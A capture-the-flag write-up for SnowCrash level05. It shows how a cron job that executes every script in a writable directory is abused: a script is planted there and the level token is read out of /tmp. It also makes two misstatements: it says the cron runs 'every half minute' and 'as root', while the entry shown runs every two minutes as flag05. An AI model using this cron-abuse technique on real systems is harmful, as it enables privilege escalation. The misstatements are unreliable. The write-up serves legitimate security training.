# level05

## Hint

As we log in as `level05` we get a message:

```shell-session
λ Securite/snowcrash42/level05 ssh level05@192.168.100.166 -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          192.168.100.166 2a04:cec0:1187:ab2:1886:f709:f517:3334 2a04:cec0:1187:ab2:a00:27ff:fef7:2e52
level05@192.168.100.166's password:
You have new mail.
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

The mail tells us that there is a crontab scheduled, every half minute, to run a script located in `/usr/sbin/openarenaserver` as root.

## the script

After inspection of script:

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

We now know that the script simply executes all scripts located in `/opt/openarenaserver`.

## cron

cron is a convenient system wide scheduling tool that runs scripts as root.

To exploit that, all we have to do is add a script that runs our `getflag` command and prints the output to a file we may access:

```shell-session
level05@SnowCrash:/opt/openarenaserver$ echo 'getflag > /tmp/flag' > getflag.sh
level05@SnowCrash:/opt/openarenaserver$ chmod 777 getflag.sh
level05@SnowCrash:/opt/openarenaserver$ ls -l
total 4
-rwxrwxrwx+ 1 level05 level05 20 May  5 12:57 getflag.sh
```

## getflag

After a minute of attempting the display of that file, we eventually get our flag:

```shell-session
level05@SnowCrash:/tmp$ cat flag
cat: flag: No such file or directory
level05@SnowCrash:/tmp$ cat flag
cat: flag: No such file or directory
level05@SnowCrash:/tmp$ cat flag
cat: flag: No such file or directory
level05@SnowCrash:/tmp$ cat flag
cat: flag: No such file or directory
level05@SnowCrash:/tmp$ cat flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
level05@SnowCrash:/tmp$ cat flag
```
